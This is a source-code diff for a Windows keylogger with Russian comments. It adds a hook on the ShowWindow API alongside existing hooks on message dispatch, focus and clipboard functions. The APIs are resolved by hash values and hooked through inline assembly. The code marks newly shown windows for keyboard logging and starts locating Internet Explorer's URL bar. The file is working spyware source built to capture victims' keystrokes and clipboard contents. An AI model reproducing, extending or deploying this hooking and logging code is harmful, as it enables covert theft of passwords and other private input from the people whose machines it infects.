@@ -165,7 +165,12 @@ namespace KeyLogger
 	bool IsDialogsSystem();
 
 	// Собфтие после обработки собщения
-    void DoAfterDispatchMessage(PMSG Msg, bool IsUnicode);
+	void DoAfterDispatchMessage(PMSG Msg, bool IsUnicode);
+
+	// Обработка отображения окон
+	void DoShowWindow(PShowWindowData Data);
+	void DoAfterShowWindow(PShowWindowData Data);
+
 }
 
 
@@ -186,18 +191,13 @@ struct TKeyLoggerInternalData
 	PKeyLogSystem System;    // Активная система
 	PKlgWndFilter Filter;       // Активный фильтр
 	DWORD LastWriteTime;     // Время последней записи в файл
-//	PList SystemFilters;     // Список не отработавших фильтров системы
-//	BOOL FileClosed;         // Файл закрыт и больше использоваться не будет
 	DWORD ImageIndex;        // Индекс текущей картинки
-//	BOOL SendAfterCompleted; // Разрешает отправить данные только после полной отработки системы
 	bool SystemCompleted;    // Система отработала
 	DWORD ActionsCount;      // Количество действий совершённые пользователем
 	DWORD MaxActions;        // Максимальное количемтво действий, после которых нужно закрыть систему
 	bool UseActionTimer;     // Использовать таймер контроля за последним вводом пользователя
 	DWORD StartTime;         // Время запуска системы
 	DWORD LastActionTime;    // Время последнего действия
-//	bool  SendLogAsCAB;      // Отправлять лог как CAB архив.
-//	bool DontSendLog;        // Не отправлять лог стандартными средствами
 	bool RemoveSystemAfterCompleted; // Удалять систему после завершения
 	PList Dialogs;           // Список активных диалоговых окон
 	bool  StopLogging;       // Переменная отключает логирование данных
@@ -230,7 +230,7 @@ namespace KeyLoggerHooks
     typedef HWND (WINAPI *TSetFocus)(HWND Wnd);
 	typedef HANDLE (WINAPI *TGetClipboardData)(UINT uFormat);
 	typedef BOOL (WINAPI *TPeekMessage)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
-
+    typedef BOOL (WINAPI *TShowWindow_)(HWND hWnd, int Cmd);
 	
 	PDispatchMessage Real_DispatchMessageA;
 	PDispatchMessage Real_DispatchMessageW;
@@ -241,7 +241,7 @@ namespace KeyLoggerHooks
 	TSetFocus Real_SetFocus;
 
 	TGetClipboardData Real_GetClipboardData;
-
+	TShowWindow_ Real_ShowWindow;
 	TPeekMessage Real_PeekMessageA;
 	TPeekMessage Real_PeekMessageW;
 
@@ -352,6 +352,25 @@ namespace KeyLoggerHooks
 		return DataHandle;
 	}
 
+
+
+	BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd)
+	{
+		// обрабатываем отображаение окна
+		TShowWindowData Data;
+		ClearStruct(Data);
+		Data.Window = hWnd;
+		Data.Command = Cmd;
+
+        KeyLogger::DoShowWindow(&Data);
+
+		BOOL Res = Real_ShowWindow(hWnd, Data.Command);
+
+		KeyLogger::DoAfterShowWindow(&Data);
+
+		return Res;
+	}
+
 	//------------------------------------------------------------------------
 
 	bool HookKeyLoggerApi()
@@ -369,20 +388,14 @@ namespace KeyLoggerHooks
 		#define HASH_PEEKMESSAGEA 0xD7A87C2C /* PeekMessageA */
 		#define HASH_PEEKMESSAGEW 0xD7A87C3A /* PeekMessageW */
 
+		const static DWORD HASH_SHOWWINDOW = 0x7506E960; /* ShowWindow */
 		const static DWORD Hash_DispatchMessageA = 0x4BAED1C8;
 		const static DWORD Hash_DispatchMessageW = 0x4BAED1DE;
 		const static DWORD Hash_SetWindowTextW = 0x3C29101C;
 
 		const static DWORD Hash_GetClipboardData = 0x8E7AE818;
 
-//		const static DWORD Hash_SendMessageA = 0x58A81C29;
-//		const static DWORD Hash_SendMessageW = 0x58A81C3F;
-//		const static DWORD Hash_PostMessageA = 0xC8A87EA7;
-//		const static DWORD Hash_PostMessageW = 0xC8A87EB1;
-//		const static DWORD Hash_SendNotifyMessageA = 0x1AB922BF;
-//		const static DWORD Hash_SendNotifyMessageW = 0x1AB922A9;
 
-		
 		if (HookApi(3, Hash_DispatchMessageA, &Hook_DispatchMessageA) )
 		{
 			__asm mov [Real_DispatchMessageA], eax
@@ -425,9 +438,11 @@ namespace KeyLoggerHooks
 			else return false;
         }
 
-
 		if( !HookApi(3, Hash_GetClipboardData, &Hook_GetClipboardData, &Real_GetClipboardData) )
 			return false;
+
+
+		HookApi(3, HASH_SHOWWINDOW, &Hook_ShowWindow, &Real_ShowWindow);
 
 		KeyLoggerApiHooked = true;
 		return true;
@@ -3016,6 +3031,35 @@ bool KeyLogger::IsSupportProcess()
 	return Result;
 }
 
+// Обработка отображения окон
+void KeyLogger::DoShowWindow(PShowWindowData Data)
+{
+	// Событие функции показа окна
+	CallEvent(KLE_SHOW_WND, Data);
+}
+
+
+void KeyLogger::DoAfterShowWindow(PShowWindowData Data)
+{
+	// Событие после функции показа окна
+	if (Data->Command == SW_SHOW)
+	{
+    	// Устанавливаем активное окно
+		KeyLogger::SetActiveWnd(Data->Window, LOG_KEYBOARD);
+
+		PKeyLogger L = GetLogger(false);
+
+		// Ищем окно ввода URL в ИЕ
+		if (L != NULL && L->Process == PROCESS_IE && KLG.UrlEditWnd == NULL)
+		{
+
+
+        }
+	}
+
+	CallEvent(KLE_AFTER_SHOW_WND, Data);
+}
+
 
 
 
@@ -3215,9 +3259,6 @@ void KLGPackerPackTextBlocks(PKeyLogPacker Packer)
 	pDeleteFileA(FileName);
 
 	STR::Free(FileName);
-
-	KLGDBG("KeyLogPacker", "Результат лога:\r\n%s", Packer->Log);
-
 }
 //-------------------------------------------------------------------------
 
